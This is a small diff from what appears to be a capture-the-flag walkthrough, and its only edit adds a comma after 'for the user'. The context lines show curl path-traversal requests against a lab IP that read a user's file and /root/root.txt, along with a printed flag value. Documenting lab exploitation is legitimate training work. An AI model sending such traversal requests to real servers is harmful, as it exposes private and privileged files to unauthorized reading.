@@ -401,7 +401,7 @@ curl http://10.10.120.193/article?name=/../../../../../../../../../../home/falco
 ```
 > 60989655118397345799
 
-for the user
+for the user,
 and...
 ```
 curl http://10.10.120.193/article?name=/../../../../../../../../../../root/root.txt
